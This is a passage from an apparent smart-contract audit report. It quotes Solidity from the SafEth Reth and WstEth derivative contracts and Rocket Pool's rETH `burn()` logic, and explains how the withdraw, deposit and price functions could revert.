class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addressStorage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_key</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }    </span></span></span></code></pre>\n<p><code>rethAddress()</code> is referred in <code>withdraw()/deposit()/ethPerDerivative()/balance()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Reth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IWETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">swapExactInputSingleHop</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:                 </span><span class=\"mtk7\">500</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><code>getAddress()</code> will also influence <code>poolCanDeposit()</code>, which could revert <code>deposit()</code> and the view function <code>ethPerDerivative()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:         ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:                 )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">))</span></span></span></code></pre>\n<ul>\n<li><code>burn()</code></li>\n</ul>\n<p>There is no guarantee that the function <code>burn()</code> will succeed.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Reth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Because in Reth contract code below, the execution may fail in several cases:</p>\n<ul>\n<li><code>burn()</code> -> <code>getTotalCollateral()</code> -> <code>getContractAddress()</code> -> <code>getAddress()</code> might fail due to the same reason above</li>\n<li>the <code>require(ethBalance >= ethAmount)</code> could fail due to low balance</li>\n<li><code>burn()</code> -> <code>withdrawDepositCollateral()</code> -> <code>getContractAddress()</code>, <code>withdrawExcessBalance()</code> both could fail for same reason as above</li>\n<li><code>msg.sender.transfer()</code> could fail due to not enough gas (2300 limit)</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// https://etherscan.io/address/0xae78736Cd615f374D3085123A210448E74Fc6393</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// RocketTokenRETH.sol: 131-146</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Burn rETH for ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check rETH amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid token burn amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) &gt;= </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Insufficient rETH balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get ETH amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get &amp; check ETH balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getTotalCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Insufficient ETH balance for exchange&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Update balance &amp; supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Withdraw ETH from deposit pool if required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">withdrawDepositCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer ETH to sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Emit tokens burned event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokensBurned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// RocketTokenRETH.sol: 98-101</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getTotalCollateral</span><span class=\"mtk1\">() </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExcessBalance</span><span class=\"mtk1\">().</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// RocketBase.sol: 112-119</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_contractName</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the current contract address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contractAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_contractName</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contractAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Contract not found&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contractAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// RocketTokenRETH.sol: 152-159</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawDepositCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check rETH contract balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">) { </span><span class=\"mtk15\">return</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawExcessBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>WstEth.sol</strong></p>\n<p>StEthEthPool function <code>exchange()</code> could fail due to <code>minOut</code> requirement.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">WstEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span 